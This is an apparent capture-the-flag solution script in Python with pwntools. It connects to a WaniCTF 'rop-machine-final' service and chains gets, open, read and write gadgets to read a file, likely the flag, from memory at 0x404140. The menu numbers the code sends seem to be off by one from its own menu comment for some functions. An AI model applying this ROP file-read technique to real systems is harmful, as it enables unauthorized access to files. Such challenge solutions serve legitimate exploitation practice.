import pwn
import sys


def read_until(s):
    ret = b""
    while ret.find(s) == -1:
        ret += io.read(1)
    return ret


def leak2val(s):
    s = s + b"\x00" * (8 - len(s))
    ret = pwn.u64(s)
    print("0x%x" % (ret))
    return ret


# [menu]
# 0x01. append hex value
# 0x02. append "pop rdi; ret" addr
# 0x03. append "pop rsi; ret" addr
# 0x04. append "pop rdx; ret" addr
# 0x05. append "pop rax; ret" addr
# 0x06. append "gets" addr
# 0x07. append "open" addr
# 0x08. append "read" addr
# 0x09. append "write" addr
# 0x0a. show menu (this one)
# 0x0b. show rop_arena
# 0x00. execute rop


def cmd_append_hex(val):
    io.send(b"1\n")
    ret = read_until(b": ")
    s = b"%x\n" % (val)
    io.send(s)
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rdi():
    io.send(b"2\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rsi():
    io.send(b"3\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rdx():
    io.send(b"4\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_gets():
    io.send(b"5\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_open():
    io.send(b"6\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_read():
    io.send(b"7\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_write():
    io.send(b"8\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_show_arena():
    io.send(b"b\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_execute():
    io.send(b"0\n")
    io.interactive()


io = pwn.remote("rop-machine-final.pwn.wanictf.org", 9005)
# io = pwn.process("./final")

ret = read_until(b">")

cmd_append_pop_rdi()
cmd_append_hex(0x404140)
cmd_append_gets()

cmd_append_pop_rdi()
cmd_append_hex(0x404140)
cmd_append_pop_rsi()
cmd_append_hex(0)
cmd_append_pop_rdx()
cmd_append_hex(0)
cmd_append_open()

cmd_append_pop_rdi()
cmd_append_hex(3)
cmd_append_pop_rsi()
cmd_append_hex(0x404140)
cmd_append_pop_rdx()
cmd_append_hex(128)
cmd_append_read()

cmd_append_pop_rdi()
cmd_append_hex(1)
cmd_append_pop_rsi()
cmd_append_hex(0x404140)
cmd_append_pop_rdx()
cmd_append_hex(128)
cmd_append_write()

cmd_execute()
